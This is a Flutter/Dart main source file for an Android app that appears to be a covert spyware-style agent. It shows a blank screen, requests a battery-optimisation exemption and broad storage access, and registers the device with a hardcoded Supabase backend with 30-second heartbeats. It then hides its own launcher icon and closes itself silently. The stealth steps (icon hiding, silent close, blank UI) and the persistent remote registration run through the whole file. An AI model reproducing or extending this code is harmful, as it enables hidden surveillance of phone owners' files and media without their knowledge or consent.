// lib/main.dart
import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'core/device_agent.dart';
import 'core/device_id.dart';
import 'app_logger.dart';

const String SUPABASE_URL = 'https://kywpnhaermwldzcwtsnv.supabase.co';
const int HEARTBEAT_INTERVAL_SECONDS = 30;

const MethodChannel _permChannel = MethodChannel('cyber_agent/permissions');
const MethodChannel _batteryChannel = MethodChannel('cyber_agent/battery');
const MethodChannel _appHider = MethodChannel('cyber_accessibility_agent/app_hider');

const String _prefSetupDone = 'setup_done';
const String _prefBatteryAsked = 'battery_asked';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  // ✅ Initialize logger FIRST
  await AppLogger.init();
  AppLogger.logLifecycle('main() started');
  
  runApp(const MediaAgentApp());
}

class MediaAgentApp extends StatelessWidget {
  const MediaAgentApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: SilentSetupPage(),
    );
  }
}

class SilentSetupPage extends StatefulWidget {
  const SilentSetupPage({super.key});

  @override
  State<SilentSetupPage> createState() => _SilentSetupPageState();
}

class _SilentSetupPageState extends State<SilentSetupPage> {
  bool _agentStarted = false;
  bool _closing = false;

  Timer? _heartbeatTimer;
  Timer? _pollTimer;

  @override
  void initState() {
    super.initState();
    AppLogger.logLifecycle('SilentSetupPage.initState');
    _silentInit();
  }

  @override
  void dispose() {
    AppLogger.logLifecycle('SilentSetupPage.dispose');
    _heartbeatTimer?.cancel();
    _pollTimer?.cancel();
    super.dispose();
  }

  Future<void> _silentInit() async {
    AppLogger.logLifecycle('_silentInit() called');
    
    try {
      final prefs = await SharedPreferences.getInstance();
      final setupDone = prefs.getBool(_prefSetupDone) ?? false;

      AppLogger.d('Setup', 'setupDone: $setupDone');

      if (setupDone) {
        AppLogger.i('Setup', 'Already setup - starting agent');
        await _startAgentIfNeeded();
        _closeAppSilently();
        return;
      }

      AppLogger.i('Setup', 'First run - starting setup flow');
      await _handleBatteryOptimization();

      try {
        AppLogger.d('Setup', 'Requesting permissions...');
        await _permChannel.invokeMethod('requestPermissions');
      } catch (e, st) {
        AppLogger.e('Setup', 'Permission request failed', e, st);
      }

      int attempts = 0;
      const maxAttempts = 180;

      _pollTimer = Timer.periodic(const Duration(milliseconds: 1500), (_) async {
        attempts++;
        final ok = await _checkStoragePermissions();
        if (ok) {
          AppLogger.i('Setup', 'Permissions granted after $attempts attempts');
          _pollTimer?.cancel();
          await _onPermissionsGranted();
        } else if (attempts >= maxAttempts) {
          AppLogger.w('Setup', 'Permission poll timeout after $attempts attempts');
          _pollTimer?.cancel();
        }
      });
    } catch (e, st) {
      AppLogger.e('Setup', '_silentInit failed', e, st);
    }
  }

  Future<void> _handleBatteryOptimization() async {
    AppLogger.d('Battery', 'handleBatteryOptimization() called');
    
    try {
      final prefs = await SharedPreferences.getInstance();
      final alreadyAsked = prefs.getBool(_prefBatteryAsked) ?? false;
      
      if (alreadyAsked) {
        AppLogger.d('Battery', 'Already asked - skipping');
        return;
      }

      final bool ignoring = await _batteryChannel.invokeMethod('isIgnoringBatteryOptimizations') == true;
      AppLogger.i('Battery', 'isIgnoring: $ignoring');

      if (!ignoring) {
        AppLogger.i('Battery', 'Requesting battery optimization exemption');
        try {
          await _batteryChannel.invokeMethod('requestIgnoreBatteryOptimizations');
        } catch (e, st) {
          AppLogger.e('Battery', 'Request failed', e, st);
        }
      }

      await prefs.setBool(_prefBatteryAsked, true);
      AppLogger.d('Battery', 'Marked as asked');
      
    } catch (e, st) {
      AppLogger.e('Battery', 'handleBatteryOptimization failed', e, st);
      try {
        final prefs = await SharedPreferences.getInstance();
        await prefs.setBool(_prefBatteryAsked, true);
      } catch (_) {}
    }
  }

  Future<bool> _checkStoragePermissions() async {
    try {
      final Map<dynamic, dynamic>? map = await _permChannel.invokeMethod('checkStoragePermissions');
      if (map == null) return false;

      if (map['hasAllFilesAccess'] == true) return true;

      if (map['readMediaImages'] == true || map['readMediaVideo'] == true || map['readMediaAudio'] == true) {
        return true;
      }

      if (map['legacyRead'] == true && map['legacyWrite'] == true) {
        return true;
      }

      return false;
    } catch (e, st) {
      AppLogger.e('Setup', 'Check permissions error', e, st);
      return false;
    }
  }

  Future<void> _onPermissionsGranted() async {
    if (_closing) return;
    _closing = true;

    AppLogger.i('Setup', 'Permissions granted - completing setup');

    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool(_prefSetupDone, true);
      AppLogger.d('Setup', 'Setup marked as done');
    } catch (e, st) {
      AppLogger.e('Setup', 'Failed to mark setup done', e, st);
    }

    await _startAgentIfNeeded();

    try {
      await _appHider.invokeMethod('hide');
      AppLogger.i('Setup', 'App icon hidden');
    } catch (e, st) {
      AppLogger.e('Setup', 'App hide failed', e, st);
    }

    await Future.delayed(const Duration(seconds: 2));
    _closeAppSilently();
  }

  Future<void> _startAgentIfNeeded() async {
    AppLogger.d('Agent', '_startAgentIfNeeded() called');
    
    if (_agentStarted) {
      AppLogger.d('Agent', 'Already started - skipping');
      return;
    }
    
    _agentStarted = true;

    try {
      final deviceId = await DeviceId.getOrCreate();
      AppLogger.i('Agent', 'Device ID: $deviceId');

      await DeviceAgent.instance.configure(
        supabaseUrl: SUPABASE_URL,
        deviceId: deviceId,
      );
      AppLogger.i('Agent', 'Agent configured');

      await DeviceAgent.instance.register();
      AppLogger.i('Agent', 'Device registered');

      _heartbeatTimer?.cancel();
      _heartbeatTimer = Timer.periodic(
        const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS),
        (_) {
          AppLogger.d('Agent', 'Sending heartbeat');
          DeviceAgent.instance.heartbeat();
        },
      );
      
      AppLogger.i('Agent', '✅ Agent started successfully');
      
    } catch (e, st) {
      AppLogger.e('Agent', '❌ Agent start failed', e, st);
      _agentStarted = false;
    }
  }

  void _closeAppSilently() {
    AppLogger.logLifecycle('Closing app silently');
    try {
      SystemNavigator.pop(animated: true);
    } catch (e, st) {
      AppLogger.e('Setup', 'SystemNavigator.pop failed', e, st);
      if (Platform.isAndroid) {
        exit(0);
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      backgroundColor: Colors.black,
      body: SizedBox.expand(),
    );
  }
}
